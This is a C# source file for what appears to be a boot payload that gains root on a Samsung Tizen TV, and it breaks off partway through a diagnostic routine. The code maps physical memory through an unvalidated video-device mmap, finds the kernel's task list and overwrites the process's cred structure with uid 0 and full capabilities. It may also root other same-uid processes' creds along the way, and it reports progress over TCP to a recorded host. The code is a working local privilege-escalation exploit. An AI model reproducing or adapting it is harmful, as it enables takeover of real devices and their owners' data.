// Boot payload: owner -> root via the V4L2 physmap, then prove it.
//
// Runs inside com.samsung.tv.MultiControl-Service (dotnet-inhouse app) as
// uid 5001, groups 29 44 100 201 6509 ... (44 = video, so /dev/video40 opens).
// Port of recon/kroot.py --fork:
//   mmap phys pages  -> find kernel Image (0x20008000) -> init_task via the
//   __ksymtab string sequence -> fork a PHYRFORK child -> find it near the
//   task-list tail -> patch the parent's cred -> uid 0 + full caps.
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

internal static class Program
{
    const string Share = "/opt/usr/home/owner/share";
    const string Marker = Share + "/root_boot.txt";
    const string SysProof = "/opt/usr/system/dsh_root_proof.txt";
    // Fallback only: deploy.sh records the real PC address in rootchan.host, which
    // HostAddr() prefers.  TEST-NET-1 keeps a private LAN IP out of the source
    // (and out of a release); a hand-built payload beacons nowhere, which is the
    // honest outcome until deploy.sh has run.
    const string Host = "192.0.2.1";
    const string HostFile = Share + "/rootchan.host";
    // One IP per line; if the file exists, only those peers may use port 31337.
    const string AllowFile = Share + "/rootchan.allow";
    // Attempt counter for the fast-exit retry loop (v9).  /tmp is tmpfs, so it
    // resets on every boot by design: each boot gets a fresh set of attempts.
    const string TryFile = "/tmp/.dsh_try";

    // kernel / task facts (measured on 24_PTM_QTV_T09, kernel 5.4.249)
    const uint PHYS_OFF = 0xA0000000;      // v = phys + PHYS_OFF  (0x20000000 -> 0xC0000000)
    const uint IMAGE_A = 0x40008000;
    const uint IMAGE_B = 0x20008000;
    const uint OFF_SEQ = 0x8912CA;
    const uint OFF_STR = 0x8912D8;
    const uint DATA_SHIFT = 0x12000;
    const uint O_COMM = 0x400;
    const uint O_CRED = 0x3F8;
    const uint O_REAL = 0x3F4;
    const uint O_CHILDREN = 0x2F8;   // list_head children (pontusml DWARF, next to the TV-measured 0x2F0/0x2F4)
    const uint O_SIBLING = 0x300;    // fork() links &child->sibling into &parent->children
    static readonly byte[] SEQ = Encoding.ASCII.GetBytes("name_to_dev_t\0init_task\0kernel_neon_end");
    static readonly byte[] IMG_SIG = { 0xEE, 0x44, 0x00, 0xEB, 0x00, 0x90, 0x0F, 0xE1 };

    // ---- libc ----
    [DllImport("libc", SetLastError = true)] static extern int open(string path, int flags);
    [DllImport("libc", SetLastError = true)] static extern int close(int fd);
    [DllImport("libc", EntryPoint = "mmap64", SetLastError = true)]
    static extern IntPtr mmap64(IntPtr addr, UIntPtr len, int prot, int flags, int fd, long off);
    [DllImport("libc", EntryPoint = "syscall", SetLastError = true)]
    static extern int syscall(int n, int a1, int a2, int a3, int a4, int a5, int a6);
    [DllImport("libc")] static extern uint getuid();
    [DllImport("libc")] static extern int fork();
    [DllImport("libc")] static extern int prctl(int opt, string arg, int a3, int a4, int a5);
    [DllImport("libc")] static extern int usleep(uint us);
    [DllImport("libc")] static extern int kill(int pid, int sig);
    [DllImport("libc", SetLastError = true)] static extern int waitpid(int pid, out int status, int options);
    [DllImport("libc", EntryPoint = "_exit")] static extern void _exit(int code);
    const int SIGKILL = 9;
    // ARM private SWI: cacheflush(start, end, flags).  The physmap mapping and
    // the kernel's own map of the same page can sit in different cache lines;
    // without this, Write32 is visible in our mapping (PatchCred readback
    // passes) while getuid() still reads 5001.  The ARM stub never hits it
    // because it munmaps after every op.

    static int _fd = -1;
    // The physmap node.  video40 is the jpeg codec and the documented one, but
    // the three sdp nodes (video30/hen, video40/jpeg, video60/dvde) each expose
    // the same unvalidated mmap, and exclusivity is PER INSTANCE (reference:
    // recon/VIDEO-PHYSMAP-2026-10-20.md).  A single hardcoded node turned one
    // busy instance into a 120 s boot delay; the list makes it portable and
    // lets the payload coexist with a browser stub on another node.
    static readonly string[] Nodes = { "/dev/video40", "/dev/video30", "/dev/video60" };
    static string _node = Nodes[0];
    static int _openErrno = 0;
    static readonly Dictionary<uint, IntPtr> Pages = new Dictionary<uint, IntPtr>();
    // fork() landmark pids that still need reaping (see ReapChildren).
    static readonly List<int> ChildPids = new List<int>();
    const int WNOHANG = 1;

    // Where should beacons go? The address the last deploy recorded on the TV wins over
// the compiled-in default, so the same payload works on any LAN.
    static string HostAddr()
    {
        try
        {
            if (File.Exists(HostFile))
            {
                string s = File.ReadAllText(HostFile).Trim();
                if (s.Length > 0) return s;
            }
        }
        catch { }
        return Host;
    }

    static string UptimeSec()
    {
        try
        {
            string s = File.ReadAllText("/proc/uptime");
            int d = s.IndexOf('.');
            if (d <= 0) d = s.IndexOfAny(new[] { ' ', '\t', '\n' });
            if (d > 0) return s.Substring(0, d);
            return s.Trim();
        }
        catch { return "?"; }
    }

    static string Beacon(string msg)
    {
        string line = "t=" + UptimeSec() + "s " + msg;
        try
        {
            using (var c = new TcpClient())
            {
                // Never block the boot path on TCP.  A stale host (PC off, or the
                // address recorded on the TV now belongs to another subnet) costs
                // SYN retries inside a ~40 s boot budget; 500 ms is enough on a
                // live LAN and the local marker below is the durable record.
                if (c.ConnectAsync(HostAddr(), 80).Wait(500))
                {
                    byte[] b = Encoding.UTF8.GetBytes("DSHROOT " + line + "\n");
                    c.GetStream().Write(b, 0, b.Length);
                    c.GetStream().Flush();
                }
            }
        }
        catch { }
        try { Directory.CreateDirectory(Share); File.AppendAllText(Marker, line + "\n"); } catch { }
        return msg;
    }

    // ---- physmap window (v24; 32 KiB slots since v27) --------------------------
    // The kernel's linear map of a physical page is at PA + 0xC0000000; ours is
    // wherever the allocator puts it.  On a VIPT L1 two mappings of one PA whose
    // VAs differ mod (way size) are DIFFERENT cache lines: a kernel write stays
    // dirty in the kernel's line and a userspace read of the same PA fetches
    // stale RAM until that line happens to be evicted.  For pages the kernel
    // keeps touching - a running task's struct, the app's own cred - that never
    // happens, which is the cold-boot attempt-1 failure: ChildParentUid /
    // direct-parent never read 5001 in the first process, while the AUL relaunch
    // (fresh mmap layout) reads it at once.  Mapping each page at
    // VA == PA (mod SlotStride) makes our cache line the kernel's line, so both
    // directions are coherent.  (v17 was the write direction of the same bug;
    // the ARM stub munmaps per op and never sees it.)  sim_rpc.ReadStaleRPC
    // models the read direction.
    //
    // v24 aligned to 8 KiB (32 KiB 4-way L1) and the mid-session relaunch still
    // showed per-LINE staleness (comm coherent, real_parent stale) - 64 KiB
    // 4-way cores alias at 16 KiB.  v25 aligned 16 KiB and ONE attempt still
    // read pre-alloc garbage at a cred page (ASCII "inti" where 5001 belongs)
    // while pointer lines in the same process read coherently: with 16 KiB
    // slots, VA bit 14 = window-base bit 14 XOR slot parity, i.e. PA bit 14 is
    // left to 50/50 per slot allocation.  The failing cred page had PA bit 14=1
    // and landed in an even slot; the task page (bit 14=0) matched.  So the
    // alias period is 32 KiB and the stride must be 0x8000 (covers every way
    // size up to 32 KiB).  If staleness persists beyond that, the direct-probe
    // map=/pva= fields compare the actual mapping VAs against PA bits.
    const int SlotStride = 0x8000;        // VIPT alias period: 32 KiB per L1 way
    const int SlotCount = 2048;           // 64 MiB window, PROT_NONE until used
    const int MAP_SHARED_F = 0x01, MAP_PRIVATE_F = 0x02, MAP_FIXED_F = 0x10;
    const int MAP_ANON_F = 0x20, MAP_NORESERVE_F = 0x4000;
    const int MAP_FIXED_NOREPLACE_F = 0x100000;  // 4.17+: never clobber an existing VMA
    static IntPtr _win = IntPtr.Zero;     // aligned window base; Zero = unavailable
    static bool _winTried = false;
    static bool _winFailBeaconed = false;     // one fixed-map-failure line per process
    static bool _releaseFailBeaconed = false; // one slot-restore-failure line per process
    static int _slotNext = 0;
    static readonly Dictionary<uint, int> SlotOf = new Dictionary<uint, int>();

    static void ReserveWindow()
    {
        if (_winTried) return;
        _winTried = true;
        try
        {
            // PROT_NONE + NORESERVE: nothing is committed until a slot is
            // remapped, and the range stays ours so a later MAP_FIXED can
            // never land on a foreign mapping.
            IntPtr raw = mmap64(IntPtr.Zero,
                                (UIntPtr)((SlotCount + 1) * SlotStride),
                                0 /*PROT_NONE*/,
                                MAP_PRIVATE_F | MAP_ANON_F | MAP_NORESERVE_F, -1, 0);
            if (raw != new IntPtr(-1))
            {
                _win = new IntPtr((raw.ToInt32() + (SlotStride - 1)) & ~(SlotStride - 1));
                Beacon("physmap window at " + _win.ToString("x8") +
                       " slots=" + SlotCount + "x" + SlotStride.ToString("x"));
            }
            else
            {
                Beacon("physmap window unavailable (mmap failed), plain mmap");
            }
        }
        catch { _win = IntPtr.Zero; Beacon("physmap window unavailable (exception)"); }
    }

    // A failed MAP_FIXED is not a no-op: Linux 5.4's mmap_region() unmaps the
    // fixed range (do_munmap) BEFORE call_mmap(), so a driver that refuses the
    // mapping leaves its address as a hole in our reservation.  Close the hole
    // immediately, before any other mmap can take it.  MAP_FIXED_NOREPLACE
    // fails with EEXIST instead of clobbering if the gap was taken (or the
    // kernel predates 4.17 and ignores the flag); in that case the window is
    // no longer trustworthy and is switched off for the rest of the process.
    static bool RestoreWindowHole(IntPtr v)
    {
        IntPtr r = new IntPtr(-1);
        try
        {
            r = mmap64(v, (UIntPtr)0x1000, 0 /*PROT_NONE*/,
                       MAP_PRIVATE_F | MAP_ANON_F | MAP_FIXED_NOREPLACE_F, -1, 0);
        }
        catch { }
        if (r == v) return true;
        _win = IntPtr.Zero;
        return false;
    }

    static IntPtr MapPage(uint page)
    {
        IntPtr p;
        if (Pages.TryGetValue(page, out p)) return p;
        ReserveWindow();
        if (_win != IntPtr.Zero)
        {
            // One slot per page, with the page placed at (page & (SlotStride-1))
            // inside the slot so the mapping VA matches the kernel linear map mod
            // the alias period - that is the whole point.  If the driver refuses
            // a fixed mapping, fall through to the plain mmap (v23 behaviour).
            if (_slotNext >= SlotCount) DropPages();
            // DropPages() can switch the window off (a slot re-protect failed),
            // so re-check before using _win to build an address.
            if (_win != IntPtr.Zero)
            {
                IntPtr v = new IntPtr(_win.ToInt32() + _slotNext * SlotStride
                                      + (int)(page & (SlotStride - 1)));
                p = mmap64(v, (UIntPtr)0x1000, 3, MAP_SHARED_F | MAP_FIXED_F, _fd, (long)page);
                if (p == v)
                {
                    Pages[page] = p;
                    SlotOf[page] = _slotNext++;
                    return p;
                }
                // The driver refused the fixed mapping; v is now a hole (see
                // RestoreWindowHole).  Restore it, then answer this page with the
                // plain mmap (v23 behaviour).  A restoration failure turns the
                // window off, so no later MAP_FIXED can clobber what took the gap.
                bool restored = RestoreWindowHole(v);
                if (!_winFailBeaconed)
                {
                    _winFailBeaconed = true;
                    Beacon(restored
                        ? "physmap fixed map failed at " + v.ToString("x8") +
                          " (hole restored), plain fallback"
                        : "physmap window off: fixed map failed at " + v.ToString("x8") +
                          ", hole not restorable");
                }
            }
        }
        p = mmap64(IntPtr.Zero, (UIntPtr)0x1000, 3, MAP_SHARED_F, _fd, (long)page);
        if (p == new IntPtr(-1))
        {
            int r = syscall(192, 0, 0x1000, 3, 1, _fd, (int)(page >> 12)); // mmap2
            // mmap2 reports failure as -errno in [-4095, -1].  A *successful*
            // mapping in the top half of the 32-bit address space is also a
            // negative int32, which the old `r < 0` check threw away.
            if (r < 0 && r >= -4095) throw new IOException("mmap failed page=" + page.ToString("x8"));
            p = (IntPtr)(uint)r;
        }
        if (Pages.Count > 8192)
        {
            // Drop the cache AND the mappings: Pages.Clear() alone leaked every
            // page it forgot, then re-mapped the same physical page again.
            foreach (var kv in Pages) ReleasePage(kv.Key, kv.Value);
            Pages.Clear();
            _slotNext = 0;
        }
        Pages[page] = p;
        return p;
    }

    // ARM cacheflush(start, end, flags=0).  Cleans userspace D-cache so a
    // kernel read of the same PA sees our write, and invalidates so our next
    // read sees a kernel write.  Failure is ignored: a no-op flush is the
    // pre-v18 behaviour.
    static void Flush(IntPtr p, int len)
    {
        if (p == IntPtr.Zero || len <= 0) return;
        try
        {
            int a = p.ToInt32();
            syscall(0x0f0002, a, a + len, 0, 0, 0, 0);
        }
        catch { }
    }

    static void DropPages()
    {
        foreach (var kv in Pages) ReleasePage(kv.Key, kv.Value);
        Pages.Clear();
        _slotNext = 0;
    }

    // Unmap one cached page.  Slot mappings are re-protected PROT_NONE instead
    // of munmapped: a munmap would punch a hole into the reservation that
    // another mmap(NULL) could grab, and a later MAP_FIXED over that hole would
    // clobber an unrelated CLR mapping.  A failed re-protect is the same hole
    // (MAP_FIXED unmapped the slot first), so it switches the window off.
    static void ReleasePage(uint page, IntPtr v)
    {
        if (SlotOf.Remove(page))
        {
            IntPtr r = new IntPtr(-1);
            try
            {
                r = mmap64(v, (UIntPtr)0x1000, 0 /*PROT_NONE*/,
                           MAP_PRIVATE_F | MAP_ANON_F | MAP_FIXED_F, -1, 0);
            }
            catch { }
            if (r != v)
            {
                _win = IntPtr.Zero;
                if (!_releaseFailBeaconed)
                {
                    _releaseFailBeaconed = true;
                    Beacon("physmap window off: slot restore failed at " + v.ToString("x8"));
                }
            }
        }
        else
        {
            try { syscall(91, v.ToInt32(), 0x1000, 0, 0, 0, 0); } catch { }  // munmap
        }
    }

    // Node policy (v39.1).  video40 is the only node this unit is known to serve
    // coherently for every read the payload performs: its scans reach phys
    // 0x60000000 and video30 is known to hang at 0x46000000.  So:
    //   EBUSY            -> KEEP RETRYING video40 for the whole budget.  A
    //                       browser stub holding video40 must not push the boot
    //                       payload onto a node that cannot finish the scan.
    //   ENOENT / ENODEV  -> the node does not exist here; try the next one.
    //   anything else    -> retry the same node (a transient EACCES/EMFILE is
    //                       not a reason to switch to a node with a different
    //                       read limit).
    // Beacon on a state CHANGE, plus one "still waiting" line every 30 s; the
    // v39 cut logged once per attempt because the index cycles.
    static bool OpenDevice(int budgetMs)
    {
        var sw = System.Diagnostics.Stopwatch.StartNew();
        int idx = 0;
        int lastIdx = -1, lastErr = -1;
        long lastWaitBeacon = 0;   // first "still waiting" line at 30 s, not at 1 s
        while (sw.ElapsedMilliseconds < budgetMs)
        {
            string n = Nodes[idx];
            int fd = open(n, 2 /*O_RDWR*/);
            if (fd >= 0)
            {
                _fd = fd;
                _node = n;
                _openErrno = 0;
                return true;
            }
            int e = Marshal.GetLastWin32Error();
            _openErrno = e;
            bool absent = (e == 2 /*ENOENT*/ || e == 19 /*ENODEV*/);
            if (absent && idx + 1 < Nodes.Length)
            {
                if (idx != lastIdx || e != lastErr)
                    Beacon("open " + n + " errno=" + e + " (absent), trying " + Nodes[idx + 1]);
                lastIdx = idx; lastErr = e;
                idx++;
                continue;
            }
            if (idx != lastIdx || e != lastErr)
            {
                lastIdx = idx; lastErr = e;
                Beacon("open " + n + " errno=" + e +
                       (e == 16 ? " (busy, retrying this node)" : " (retrying this node)"));
            }
            else if (sw.ElapsedMilliseconds - lastWaitBeacon >= 30000)
            {
                lastWaitBeacon = sw.ElapsedMilliseconds;
                Beacon("open " + n + " still errno=" + e + " after " +
                       (sw.ElapsedMilliseconds / 1000) + "s");
            }
            usleep(1000000);
        }
        return false;
    }

    // One RDWR opener: close, then retry open.  Call only while no landmark
    // child exists.  v20 called this after fork(); the child still held the
    // inherited fd, open() returned -1, and the hunt never ran.
    static bool ReopenVideo()
    {
        DropPages();
        int old = _fd;
        _fd = -1;
        if (old >= 0) { try { close(old); } catch { } }
        bool ok = OpenDevice(30000);
        Beacon("reopen " + _node + " fd=" + _fd + (ok ? "" : " errno=" + _openErrno));
        return ok;
    }

    static void CloseDevice()
    {
        try { if (_fd >= 0) { close(_fd); Beacon("device closed"); } } catch { }
        _fd = -1;
    }

    static byte[] ReadPhys(uint phys, int len)
    {
        var outb = new byte[len];
        int done = 0;
        while (done < len)
        {
            uint cur = phys + (uint)done;
            uint page = cur & 0xFFFFF000;
            int off = (int)(cur & 0xFFF);
            int chunk = Math.Min(len - done, 0x1000 - off);
            IntPtr p = MapPage(page);
            Flush(IntPtr.Add(p, off), chunk);
            Marshal.Copy(IntPtr.Add(p, off), outb, done, chunk);
            done += chunk;
        }
        return outb;
    }

    static uint U32(byte[] b, int o) => (uint)(b[o] | (b[o + 1] << 8) | (b[o + 2] << 16) | (b[o + 3] << 24));

    static void Write32(uint phys, uint val)
    {
        int off = (int)(phys & 0xFFF);
        if (off <= 0xFFC)
        {
            IntPtr p = MapPage(phys & 0xFFFFF000);
            IntPtr slot = IntPtr.Add(p, off);
            Marshal.WriteInt32(slot, unchecked((int)val));
            Flush(slot, 4);
            return;
        }
        // A 4-byte word that starts in the last 3 bytes of a page crosses the
        // mapping (the stub rejects this; the payload used to write past its own
        // 4 KiB mapping).  Split it byte-wise instead of refusing the write.
        for (int i = 0; i < 4; i++)
        {
            uint a = phys + (uint)i;
            IntPtr p = MapPage(a & 0xFFFFF000);
            IntPtr at = IntPtr.Add(p, (int)(a & 0xFFF));
            Marshal.WriteByte(at, (byte)(val >> (8 * i)));
            Flush(at, 1);
        }
    }

    // VMSPLIT_3G, not LPAE (the kernel .config has CONFIG_ARM_LPAE unset,
    // CONFIG_VMSPLIT_3G=y, CONFIG_HIGHMEM=y, PAGE_OFFSET=0xC0000000).  The linear
    // map covers lowmem only - at most 512 MiB of physical here, so it ends at VA
    // 0xE0000000; everything above that is vmalloc/module space and `v - 0xA0000000`
    // is NOT a valid translation there.  Accept the full 32-bit kernel range for
    // POINTER SHAPE (trap 5), but do not expect to READ a task/cred above
    // 0xE0000000: the v31 cold boot showed every coherent read below it (0/21
    // creds, 0/81 task pointers high).  A high value is a garbage read, not a
    // high allocation that needs more time.
    static bool Kptr(uint v) => v >= 0xC0000000;

    // 5001 = our uid, 0 = already root, 0xFFFFFFFF = not a readable cred
    static uint CredUid(uint cred)
    {
        if (!Kptr(cred)) return 0xFFFFFFFF;
        try { return U32(ReadPhys(V2P(cred) + 4, 4), 0); } catch { return 0xFFFFFFFF; }
    }

    // Beacon spelling of a CredUid result: 0xFFFFFFFF reads as "unread" so a
    // probe line distinguishes "cred page unreadable" from a literal 0xFFFFFFFF.
    static string UidWord(uint u) => u == 0xFFFFFFFF ? "unread" : u.ToString();

    // One-shot physmap read through a PLAIN mmap (allocator-chosen VA), for the
    // direct-probe diagnostic only: the same PA through a different VA geometry.
    // plain != window read -> the staleness IS VA geometry (VIPT aliasing, and
    // the window alignment is not the alias period).  plain == window read, both
    // garbage -> the page's RAM content itself is stale and no mapping fixes it.
    // usedVa reports the VA the allocator picked, so a "lucky" coherent plain
    // read can be checked against the PA bits offline.
    static uint ReadPhysPlainU32(uint phys, out IntPtr usedVa)
    {
        usedVa = IntPtr.Zero;
        uint page = phys & 0xFFFFF000;
        int off = (int)(phys & 0xFFF);
        IntPtr p = mmap64(IntPtr.Zero, (UIntPtr)0x1000, 3, MAP_SHARED_F, _fd, (long)page);
        if (p == new IntPtr(-1)) return 0xFFFFFFFF;
        usedVa = p;
        try
        {
            Flush(IntPtr.Add(p, off), 4);
            var b = new byte[4];
            Marshal.Copy(IntPtr.Add(p, off), b, 0, 4);
            return U32(b, 0);
        }
        finally
        {
            try { syscall(91, p.ToInt32(), 0x1000, 0, 0, 0, 0); } catch { }  // munmap
        }
    }

    // The window VA a page is currently mapped at (probe diagnostic: compare its
    // bits against the PA's to check the alias alignment directly).
    static string MapVa(uint phys)
    {
        IntPtr v;
        return Pages.TryGetValue(phys & 0xFFFFF000, out v) ? v.ToString("x8") : "plain";
    }

    // Hex of the first n bytes at a physical address (window path) - lets the
    // probe say whether a "cred" pointer actually lands on cred-shaped data.
    static string HexHead(uint phys, int n)
    {
        try
        {
            byte[] b = ReadPhys(phys, n);
            var sb = new StringBuilder(n * 2);
            for (int i = 0; i < n; i++) sb.Append(b[i].ToString("x2"));
            return sb.ToString();
        }
        catch { return "err"; }
    }
    static uint V2P(uint v) => (v - PHYS_OFF) & 0xFFFFFFFF;

    static string CStr(byte[] b)
    {
        int z = Array.IndexOf(b, (byte)0);
        if (z < 0) z = b.Length;
        return Encoding.ASCII.GetString(b, 0, z);
    }

    static uint FindBase()
    {
        foreach (uint a in new[] { IMAGE_A, IMAGE_B })
        {
            try
            {
                byte[] got = ReadPhys(a, 8);
                bool ok = true;
                for (int i = 0; i < 8; i++) if (got[i] != IMG_SIG[i]) { ok = false; break; }
                if (ok) return a;
            }
            catch { }
        }
        return 0;
    }

    static uint LocateInit(uint baseAddr)
    {
        uint want = baseAddr + OFF_SEQ + DATA_SHIFT;
        foreach (uint span in new uint[] { 0x100000, 0x400000, 0x1000000 })
        {
            uint start = (want - span) & 0xFFFF0000;
            for (uint a = start; a < want + span; a += 0x10000)
            {
                byte[] d;
                try { d = ReadPhys(a, 0x10000); } catch { continue; }
                int i = IndexOf(d, SEQ);
                if (i < 0) continue;
                uint seqPhys = a + (uint)i;
                uint strPhys = seqPhys + (OFF_STR - OFF_SEQ);
                uint name = strPhys + PHYS_OFF;
                byte[] pat = BitConverter.GetBytes(name);
                uint s0 = (strPhys - 0x100000) & 0xFFFF0000;
                for (uint p = s0; p < strPhys; p += 0x10000)
                {
                    byte[] w;
                    try { w = ReadPhys(p, 0x10000); } catch { continue; }
                    int j = IndexOf(w, pat);
                    while (j >= 0)
                    {
                        uint hit = p + (uint)j;
                        uint val = 0, ns = 0;
                        try { val = U32(ReadPhys(hit - 4, 4), 0); } catch { }
                        try { ns = U32(ReadPhys(hit + 4, 4), 0); } catch { }
                        if (Kptr(val) && ns == 0) return val;
                        j = IndexOf(w, pat, j + 1);
                    }
                }
            }
        }
        return 0;
    }

    static int IndexOf(byte[] hay, byte[] needle, int from = 0)
    {
        int end = hay.Length - needle.Length;
        for (int i = from; i <= end; i++)
        {
            int k = 0;
            while (k < needle.Length && hay[i + k] == needle[k]) k++;
            if (k == needle.Length) return i;
        }
        return -1;
    }

    static bool CommAt(uint taskVirt, byte[] want)
    {
        try
        {
            byte[] c = ReadPhys(V2P(taskVirt) + O_COMM, 16);
            for (int i = 0; i < want.Length; i++) if (c[i] != want[i]) return false;
            return true;
        }
        catch { return false; }
    }

    static List<uint> TaskOffsets(uint initPhys, uint initVirt)
    {
        var res = new List<uint>();
        byte[] buf;
        try { buf = ReadPhys(initPhys, 0x800); } catch { return res; }
        for (uint o = 0; o < 0x800 - 8; o += 4)
        {
            uint prv = U32(buf, (int)o + 4);
            if (!Kptr(prv)) continue;
            uint h = initVirt + o;
            if (prv == h) continue;
            uint task = (prv - o) & 0xFFFFFFFF;
            try
            {
                byte[] c = ReadPhys(V2P(task) + O_COMM, 16);
                int z = Array.IndexOf(c, (byte)0);
                if (z <= 0) continue;
                bool printable = true;
                for (int i = 0; i < z; i++) if (c[i] < 32 || c[i] >= 127) { printable = false; break; }
                if (printable) res.Add(o);
            }
            catch { }
        }
        return res;
    }

    // (FindCommNearTail lived here until v39.  It was never called after the
    // direct-parent path replaced the comm scan; the round walk in Main() does
    // the tail scan itself, with the `pre`/latch logic that made this obsolete.)

    // Pointer-shape validation only: a real cred lives in the direct map, has a
    // small refcount and plausible ids.  Whether it is OURS is PatchCred's job
    // (uid == 5001); Python's _sane_cred is the same shape check.
    static bool SaneCred(uint phys)
    {
        if (phys < 0x20000000 || phys >= 0x60000000 || (phys & 3) != 0) return false;
        try
        {
            byte[] head = ReadPhys(phys, 36);
            if (U32(head, 0) > 0x10000) return false;          // cred->usage
            for (int o = 4; o < 36; o += 4)
                if (U32(head, o) > 0x1000000) return false;    // uid/gid..fsgid
            return U32(head, 4) < 0x100000;                    // uid
        }
        catch { return false; }
    }

    static bool PatchCred(uint cred)
    {
        if (cred >= 0xC0000000) cred = V2P(cred);
        // M4: only ever write a cred that is still OURS (uid 5001). A cred that
        // already reads 0 is rooted - either ours from an earlier pass, or (if a
        // bogus real_parent slipped through) init's. Writing it would touch a
        // foreign cred for nothing, so it counts as "already done".
        uint uid;
        try { uid = U32(ReadPhys(cred + 4, 4), 0); } catch { return false; }
        if (uid != 5001) return false;
        if (!SaneCred(cred)) return false;
        try
        {
            for (uint i = 0; i < 8; i++) Write32(cred + 4 + i * 4, 0);
            Write32(cred + 48, 0xFFFFFFFF); Write32(cred + 52, 0x3F);
            Write32(cred + 56, 0xFFFFFFFF); Write32(cred + 60, 0x3F);
            byte[] ids = ReadPhys(cred + 4, 32);
            for (int i = 0; i < 32; i++) if (ids[i] != 0) return false;
            // Drop the cached physmap pages so the next kernel access of this
            // PA is a miss.  Flush above writes the line back; without unmap,
            // attempt 3 of the 3.5 min boot saw uid=0 in our mapping while
            // getuid() stayed 5001.
            DropPages();
            return true;
        }
        catch { return false; }
    }

    // Content-scan fallback for the cold-boot attempt-1 state: our own task's
    // cred-pointer line can read stale (v27 cold boot: cred=00000000 for 20 s
    // while getuid() worked), but cred PAGES of non-hot processes read
    // coherently and the landmark child's cred is a fork COPY of ours from the
    // same cred_jar seconds earlier.  Scan outward from the child's cred page
    // (lower physical addresses first: ours was allocated before it and boot
    // slab growth carves pages roughly upward), patch every SANE uid-5001 cred
    // except the child's own, and stop the moment getuid() flips - the one that
    // roots us is ours.  Freed slab creds are excluded by SaneCred (the SLUB
    // freelist pointer overwrites cred->usage).  Bounded collateral: the scan
    // may root another uid-5001 app's cred before it reaches ours, so the
    // patch budget is PROCESS-WIDE (v30): it used to be per call, and the four
    // v29 rounds multiplied the documented "8" by up to four.  A slab cred
    // normally fits inside one page, so a page-local pattern find is correct
    // here; an offset-0 hit (the object starts in the previous page) is refused
    // rather than guessed at, without stopping the page.  The 0x60000000 stop
    // is the end of the ARM32 direct map (the video30 stub's 0x46000000 hang
    // line does NOT apply to video40: the v28 probe read phys 0x60000000
    // through the payload successfully).
    // Sim twin: cred_scan_near in tools/sim_rpc.py.
    static int _scanPatched = 0;   // process-wide collateral budget, reset per process
    static bool CredScanNear(uint childCred, out int patched)
    {
        patched = 0;
        const int MaxPatched = 8;   // v28 relaunch: 4 neighbours patched, ours
                                    // still stale.  v30: total per process.
        if (_scanPatched >= MaxPatched) return false;
        if (!Kptr(childCred)) return false;
        uint ccPhys = V2P(childCred);
        uint page0 = ccPhys & 0xFFFFF000;
        var pat = new byte[32];
        for (int i = 0; i < 4; i++)
        {
            BitConverter.GetBytes(5001u).CopyTo(pat, i * 8);
            BitConverter.GetBytes(100u).CopyTo(pat, i * 8 + 4);
        }
        const int MaxSteps = 256;   // +/- 1 MiB around the child's cred page
        for (int step = 0; step <= MaxSteps && getuid() != 0 && _scanPatched < MaxPatched; step++)
        {
            int[] dirs = step == 0 ? new[] { 0 } : new[] { -1, 1 };
            foreach (int dir in dirs)
            {
                uint page = page0 + (uint)(dir * step * 0x1000);
                if (page < 0x20000000 || page >= 0x60000000) continue;
                byte[] data;
                try { data = ReadPhys(page, 0x1000); } catch { continue; }
                int idx = IndexOf(data, pat);
                // v30: an ids pattern at offset 0-3 points at a cred object
                // that starts before this page, so this page-local read does
                // not contain its usage word - refuse that one hit, but keep
                // looking on this page.  The old `while (idx >= 4)` stopped
                // the whole page at the first such hit.
                while (idx >= 0)
                {
                    if (idx >= 4)
                    {
                        uint credPhys = page + (uint)idx - 4;
                        if (credPhys != ccPhys && PatchCred(credPhys))
                        {
                            patched++;
                            _scanPatched++;
                            if (getuid() == 0) return true;
                            if (_scanPatched >= MaxPatched) return false;
                        }
                    }
                    idx = IndexOf(data, pat, idx + 1);
                }
            }
        }
        return false;
    }

    // ---- v38.1: high-allocation probe (read-only diagnostic) -------------------
    // Why a parent/cred at/above 0xE0000000 never reads coherently has exactly
    // two candidate causes (cache visibility is closed: v28 measured uid ==
    // plain garbage through two VA geometries):
    //   (a) wrong translation - a high VA is not a linear-map address, so
    //       `va - 0xA0000000` reads the wrong frame (junk = other RAM,
    //       0xFF = unbacked).  NOTE: the linear map's end on THIS unit is
    //       unmeasured - the 0xE0000000/0xE0800000 split traces to a stale
    //       recon-tree comment that a later revision retracted, and nobody has
    //       read high_memory here - so (a) is the lead, not a proven fact;
    //   (b) video40 returns wrong bytes even for the frame it is pointed at.
    // This probe is the measurement that tells them apart.  READS ONLY: no
    // Write32, no PatchCred.  It runs once, in the fast-mode gate branch right
    // before the existing fast-exit, under a 2.5 s stopwatch so the attempt-1
    // exit stays fast.  The gate, Kptr and every timing are untouched (trap 16).
    //
    // v38.1 (code review): tasks are NOT page-aligned (0xe2df7300 sits at page
    // offset 0x300), so the first cut that probed page+0x400/page+0x3F8 could
    // never hit a real task and would always have reported "miss".  The probe
    // now works on task ADDRESSES:
    //   linear      - CommAt(parent) reads "PHYSRPT1\0" at the translated
    //                 parent address itself: the read path got the right frame
    //                 and still returned junk cred words;
    //   elsewhere   - sweep proven RAM (0x20000000..0x40000000, the band
    //                 LocateInit/CredScanNear/the tail walks already cover) for
    //                 the 8 name bytes at ANY offset (slab objects are not
    //                 page-aligned), verify the NUL follow-byte at hit+8 across
    //                 the page edge, take the task as hit-0x400, and accept it
    //                 only when its children list (task+0x2F8, next OR prev)
    //                 contains &child->sibling = child+0x300 - fork() links
    //                 the sibling member, not tasks (0x23C), and the pontusml
    //                 DWARF confirms children=0x2F8/sibling=0x300 beside the
    //                 TV-measured 0x2F0/0x2F4/0x3F8/0x400.  at= is the TASK
    //                 address; cuid=5001 there would make a locate-and-patch
    //                 read path possible without touching the gate;
    //   cred-elsewhere - parent low, cred high: locate the ids pattern (every
    //                 hit per page; an offset-0..3 hit is skipped, not
    //                 page-closing, as in CredScanNear) and turn the physical
    //                 cred into a VA before CredUid.
    // The translated page (0x40000000..0x5FFFFFFF) is only ever POINT-read -
    // the access class the direct-probe phead=/pplain= lines have used since
    // v28.  Full-page reads are slower than the first cut's 16-byte probe, so
    // the 2.5 s budget may stop the sweep inside the +/-16 MiB requested range;
    // cov= is the range ACTUALLY read and a miss is inconclusive, not evidence
    // of absence.
    // Twin: high_alloc_probe in tools/sim_rpc.py.

    static void HighAllocProbe(uint child, uint parent, uint cred)
    {
        const int BudgetMs = 2500;     // attempt 1 must still exit fast
        const int SpanPages = 4096;    // +/- 16 MiB requested around the anchor page
